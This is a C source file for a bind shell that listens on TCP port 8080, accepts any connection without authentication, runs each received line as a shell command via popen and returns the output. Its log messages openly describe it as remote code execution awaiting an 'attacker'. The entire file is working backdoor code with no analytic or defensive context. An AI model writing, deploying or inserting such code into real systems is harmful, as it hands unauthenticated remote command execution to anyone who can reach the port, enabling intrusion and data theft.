#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define BUFFER_SIZE 5100

volatile sig_atomic_t keep_running = 1;

void handle_sigint(int sig);

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0}, output_buffer[BUFFER_SIZE] = {0};
    char command_with_stderr[BUFFER_SIZE + 20];

    struct sigaction sa;
    sa.sa_handler = handle_sigint;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }
    printf("[LOG] Socket created successfully.\n");

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("Setsockopt failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }
    printf("[LOG] Bind to port %d successful.\n", PORT);

    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }
    printf("[RCE] Remote Shell Active on Port %d\n", PORT);

    printf("[LOG] Waiting for connections...\n");


    while (keep_running) {
        printf("[LOG] Waiting for attacker...\n");
        if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
            if (errno == EINTR) break;
            perror("Accept failed");
            continue;
        }
        printf("[LOG] Connection accepted!\n");

        while (1) {
            memset(buffer, 0, BUFFER_SIZE);

            int valread = read(new_socket, buffer, BUFFER_SIZE -1);

            if (valread < 0) {
                if (errno == EINTR) break;
                perror("Read failed");
                break;
            }
            else if (valread == 0) {
                printf("[LOG] Client disconnected.\n");
                break;
            }

            buffer[valread] = '\0';
            buffer[strcspn(buffer, "\r\n")] = 0;

            int i;
            char temp[BUFFER_SIZE] = {0};
            for (i = 0; buffer[i] != '\0'; i++) {
                temp[i] = toupper((unsigned char)buffer[i]);
            }
            temp[i] = '\0';

            if (strcmp(temp, "EXIT") == 0) {
                printf("[LOG] Attacker sent EXIT.\n");
                break;
            }

            printf("[EXEC] Command: %s\n", buffer);

            snprintf(command_with_stderr, sizeof(command_with_stderr), "%s 2>&1", buffer);

            FILE *fp = popen(command_with_stderr, "r");

            if (fp == NULL) {
                char *msg = "Failed to run command\n";
                send(new_socket, msg, strlen(msg), 0);
                continue;
            }

            while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
                send(new_socket, output_buffer, strlen(output_buffer), 0);
            }

            pclose(fp);
            
            char *end_msg = "\n-- EOF --\n"; 
            send(new_socket, end_msg, strlen(end_msg), 0);
        }

        close(new_socket);
        printf("[LOG] Attacker disconnected.\n");
    }

    close(server_fd);
    printf("[LOG] Server closed gracefully.\n");
    
    return 0;
}

void handle_sigint(int sig) {
    keep_running = 0;
}